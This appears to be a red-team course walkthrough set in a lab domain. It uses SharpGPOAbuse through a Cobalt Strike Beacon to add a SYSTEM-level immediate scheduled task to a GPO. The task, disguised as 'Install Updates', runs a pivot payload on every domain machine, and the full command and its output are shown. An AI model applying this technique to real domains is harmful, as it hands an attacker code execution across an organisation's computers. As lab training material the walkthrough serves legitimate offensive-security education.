[SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) allows a wider range of "abusive" configurations to be added to a GPO. It cannot create GPOs, so we must still do that with RSAT or modify one we already have write access to. In this example, we add an Immediate Scheduled Task to the PowerShell Logging GPO, which will execute as soon as it's applied.

```
beacon> getuid
[*] You are DEV\bfarmer

beacon> execute-assembly C:\Tools\SharpGPOAbuse\SharpGPOAbuse\bin\Debug\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"

[+] Domain = dev.cyberbotic.io
[+] Domain Controller = dc-2.dev.cyberbotic.io
[+] Distinguished Name = CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io
[+] GUID of "PowerShell Logging" is: {AD7EE1ED-CDC8-4994-AE0F-50BA8B264829}
[+] Creating file \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{AD7EE1ED-CDC8-4994-AE0F-50BA8B264829}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.
[+] Done!
```  

As all the machines in the domain refresh their GPOs (or if you do it manually), many Beacons you shall have!
![](https://rto-assets.s3.eu-west-2.amazonaws.com/group-policy/sharpgpoabuse.png)